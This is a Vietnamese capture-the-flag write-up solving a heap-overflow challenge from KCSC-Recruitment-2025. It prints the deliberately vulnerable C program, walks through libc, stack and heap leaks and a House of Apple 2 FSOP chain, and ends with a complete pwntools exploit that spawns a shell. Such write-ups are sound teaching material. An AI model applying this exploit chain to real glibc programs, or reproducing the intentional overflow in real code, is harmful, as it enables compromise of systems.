Hướng dẫn cách giải bài LapTrinhCanBan của giải KCSC-Recruitment-2025

**Author:** Nguyễn Cao Nhân aka Nhân Sigma

**Category:** Binary Exploitation

**Date:** 28/09/2026

## 1. Mục tiêu

Đầu tiên là đọc code đã

```C
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}
struct sinhVien {
    char *name;
    unsigned int age;
    float score;
    struct sinhVien *next;
};
typedef struct sinhVien sinhVien;
int my_read(char buf[],unsigned int size){
    int len ,i ;
    len = read(0,buf,size) ;
    for(i =0 ;i<len;i++){
        if(buf[i]=='\n'){
            buf[i] = NULL ;
        }
    }
    return len ;
}
void menu() {
    puts("1. Add student");
    puts("2. Print student");
    puts("3. Delete student");
    puts("4. Exit");
    printf("> ");
}

sinhVien *makeSV() {
    sinhVien *newSV = (sinhVien*)malloc(sizeof(sinhVien));
    unsigned int size ;
    printf("Size name: ");
    scanf("%u",&size) ;
    newSV->name = malloc(size);
    printf("Name: ");
    my_read(newSV->name,0x1337) ;        // Heap Overflow
    printf("Age: ");
    scanf("%u", &newSV->age);
    printf("Score: ");
    scanf("%f", &newSV->score);
    getchar();
    newSV->next = NULL;
    return newSV;
}

void add(sinhVien** top) {
    sinhVien* newnode = makeSV();
    if (*top == NULL) {
        *top = newnode;
    } else {
        sinhVien* tmp = *top;
        while (tmp->next != NULL) {
            tmp = tmp->next;
        }
        tmp->next = newnode;
    }
}

void show(sinhVien* top) {
    unsigned int idx = 0;
    puts("$$$$$ KCSC SCORE $$$$$");
    while (top != NULL) {
        printf("ID: %d\nNAME: %s\nAGE: %d\nSCORE: %.2f\n\n", idx, top->name, top->age, top->score);
        top = top->next;
        idx++;
    }
    puts("$$$$$$$$$$$$$$$$$$$$$$");
}

void delete(sinhVien **head, unsigned int idx) {
    if (*head == NULL) {
        printf("List is empty. Cannot delete.\n");
        return;
    }
    sinhVien *temp = *head;
    if (idx == 0) {
        *head = temp->next; 
        free(temp->name);
        free(temp);
        printf("Successfull.\n");
        return;
    }
    sinhVien *prev = NULL;
    for (unsigned int i = 0; i < idx; i++) {
        if (temp == NULL) {
            printf("Invalid index.\n");
            return;
        }
        prev = temp;
        temp = temp->next;
    }
    if (temp == NULL) {
        printf("Invalid index.\n");
        return;
    }
    prev->next = temp->next;
    free(temp->name);
    free(temp);
    printf("Successfull.\n");
}

int main() {
    setup();
    puts("Welcome to KCSC Score !!!");
    sinhVien *head = NULL;
    unsigned int choice;
    while (1) {
        menu();
        scanf("%u", &choice);
        getchar(); 
        switch (choice) {
            case 1:
                add(&head);
                break;
            case 2:
                show(head);
                break;
            case 3:
                printf("Index: ");
                scanf("%u", &choice);
                getchar(); 
                delete(&head,choice);
                break;
            case 4:
                exit(0);
            default:
                puts("Invalid choice.");
                break;
        }
    }
}

```

Bài này chỉ có mỗi lỗi **Heap Overflow** thôi, nhưng như vậy là quá đủ rồi. Nhìn vô là biết ngay ta sẽ sử dụng kĩ thuật **FSOP**, mà muốn xài cần leak 2 thứ quan trọng là Libc và Heap. Libc thì leak khá dễ nhờ lỗi **Heap Overflow**, còn Heap thì còn dễ nốt. Ok bắt tay vô làm thôi.

## 2. Cách thực thi
Đầu tiên là phải leak libc đã, cái gì dễ làm trước. Như mình nói có lỗi **Heap Overflow**. Khi ta `add`, nó sẽ tạo ra 2 chunk. Chunk đầu là chứa địa chỉ `name` + các thông tin lặt vật không cần quan tâm. Chunk 2 là `name` của chúng ta. Nghe tới đây là biết ta sẽ làm gì tiếp theo. Mình sẽ thay đổi giá trị `name` thành got của `puts` để in ra libc.

<img width="716" height="197" alt="image" src="https://github.com/user-attachments/assets/2c1be744-7101-493b-9106-428f708a0883" />

```Python
add(20, b'A')
add(20, b'B')
delete(0)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(exe.got['puts'])

add(20, payload)
view()
```

Sau khi leak được libc thì ta sẽ leak heap. Ta sẽ sử dụng 1 cơ chế của `unsortbin` đó là cắt chunk ra nhường chunk cho thằng mới nếu nó nhỏ hơn. 

<img width="1358" height="191" alt="image" src="https://github.com/user-attachments/assets/fca14582-88e1-42bb-a1d1-b4be6ed434d9" />

Khi cắt chunk ra thì vô tình nó không xóa `main_arena ( aka libc )` và `fd bk` của nó, thành ra ta có thể leak được heap.

```Python
add(1048, b'A')
add(100, b'B')
delete(2)

add(30, b'A' * 16)
view()

p.recvuntil(b'ID: 3')
p.recvuntil(b'NAME: ')
p.recvuntil(b'A' * 16)
heap = u64(p.recv(4) + b'\x00\x00\x00\x00') - 0x2b0 - 0x80
log.success(f'Heap base : {hex(heap)}')
```

Sau khi có được 2 thứ quan trọng nhất rồi thì mình sẽ tạo 1 `fake struct` và setup để chuẩn bị thay đổi `_IO_list_all` trỏ vào `fake struct`.

```Python
fake_file = heap + 0x390
fake_wide = fake_file + 0x100
fake_vtable = fake_file + 0x200

payload = bytearray(b'\x00' * 0x300)

payload[0x00:0x08] = p64(0x3b01010101010101)
payload[0x08:0x10] = b"sh\x00".ljust(8, b'\x00')
payload[0x68:0x70] = p64(0)
payload[0x88:0x90] = p64(fake_file + 0x80)
payload[0xa0:0xa8] = p64(fake_wide)
payload[0xc0:0xc4] = p32(1)
payload[0xd8:0xe0] = p64(libc.symbols['_IO_wfile_jumps'])

payload[0x100 + 0x18:0x100 + 0x20] = p64(0)
payload[0x100 + 0x20:0x100 + 0x28] = p64(1)
payload[0x100 + 0x30:0x100 + 0x38] = p64(0)
payload[0x100 + 0xe0:0x100 + 0xe8] = p64(fake_vtable)

payload[0x200 + 0x68:0x200 + 0x70] = p64(libc.symbols['system'])

add(950, payload)
```

Để setup thì mình sẽ tạo 3 note, xóa lần lượt từ dưới lên và dùng **Heap Overflow** để sửa `fd` của note 2 thành `_IO_list_all`.

```Python
add(100, b'A')
add(100, b'B')
add(100, b'C')

delete(7)
delete(6)
delete(5)

victim_20 = heap + 0x7f0
next_20   = heap + 0x880

io_file = libc.symbols['_IO_list_all']

payload = b'A' * 104
payload += p64(0x21)
payload += p64(next_20 ^ (victim_20 >> 12))
payload += p64(0)
payload += p64(0)
payload += p64(0x71)
# payload += p64(rbp ^ ((heap + 0x810) >> 12))
payload += p64(io_file ^ ((heap + 0x810) >> 12))

add(100, payload)
add(100, b'Dummy')
add(100, p64(heap + 0x390))
```

<img width="792" height="81" alt="image" src="https://github.com/user-attachments/assets/2e43b983-f8c9-48a6-a6fc-934ce9415366" />

Giờ chỉ việc rút ra và sửa để nó trỏ vào `fake struct` của mình rồi out chương trình là get shell. Kĩ thuật **FSOP** này có tên là **House Of Apple 2**. Mình có giải thích chi tiết cách hoạt động + cách setup rồi, hãy qua coi thử nha 🐧.

## 3. Exploit
```Python
#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process('./chall_patched')

def add(size, payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size name: ', str(size).encode())
    p.sendafter(b'Name: ', payload)
    p.sendlineafter(b'Age: ', b'1')
    p.sendlineafter(b'Score: ', b'1')

def view():
    p.sendlineafter(b'> ', b'2')

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

add(20, b'A')
add(20, b'B')
delete(0)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(exe.got['puts'])

add(20, payload)
view()

p.recvuntil(b'ID: 0')
p.recvuntil(b'NAME: ')
leak_libc = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Libc : {hex(leak_libc)}')
libc.address = leak_libc - libc.symbols['puts']
log.success(f'Libc base : {hex(libc.address)}')

environ = libc.symbols['environ']
delete(1)

payload = b'A' * 24
payload += p64(0x21)
payload += p64(environ)

add(20, payload)
view()

p.recvuntil(b'ID: 0')
p.recvuntil(b'NAME: ')
leak_stack = u64(p.recv(6) + b'\x00\x00')
log.success(f'Leak Stack : {hex(leak_stack)}')
rbp = leak_stack - 0x148
log.success(f'RBP : {hex(rbp)}')

add(1048, b'A')
add(100, b'B')
delete(2)

add(30, b'A' * 16)
view()

p.recvuntil(b'ID: 3')
p.recvuntil(b'NAME: ')
p.recvuntil(b'A' * 16)
heap = u64(p.recv(4) + b'\x00\x00\x00\x00') - 0x2b0 - 0x80
log.success(f'Heap base : {hex(heap)}')

fake_file = heap + 0x390
fake_wide = fake_file + 0x100
fake_vtable = fake_file + 0x200

payload = bytearray(b'\x00' * 0x300)

payload[0x00:0x08] = p64(0x3b01010101010101)
payload[0x08:0x10] = b"sh\x00".ljust(8, b'\x00')
payload[0x68:0x70] = p64(0)
payload[0x88:0x90] = p64(fake_file + 0x80)
payload[0xa0:0xa8] = p64(fake_wide)
payload[0xc0:0xc4] = p32(1)
payload[0xd8:0xe0] = p64(libc.symbols['_IO_wfile_jumps'])

payload[0x100 + 0x18:0x100 + 0x20] = p64(0)
payload[0x100 + 0x20:0x100 + 0x28] = p64(1)
payload[0x100 + 0x30:0x100 + 0x38] = p64(0)
payload[0x100 + 0xe0:0x100 + 0xe8] = p64(fake_vtable)

payload[0x200 + 0x68:0x200 + 0x70] = p64(libc.symbols['system'])

add(950, payload)

add(100, b'A')
add(100, b'B')
add(100, b'C')

delete(7)
delete(6)
delete(5)

victim_20 = heap + 0x7f0
next_20   = heap + 0x880

io_file = libc.symbols['_IO_list_all']

payload = b'A' * 104
payload += p64(0x21)
payload += p64(next_20 ^ (victim_20 >> 12))
payload += p64(0)
payload += p64(0)
payload += p64(0x71)
# payload += p64(rbp ^ ((heap + 0x810) >> 12))
payload += p64(io_file ^ ((heap + 0x810) >> 12))

add(100, payload)
add(100, b'Dummy')
pause()
add(100, p64(heap + 0x390))

p.interactive()
```
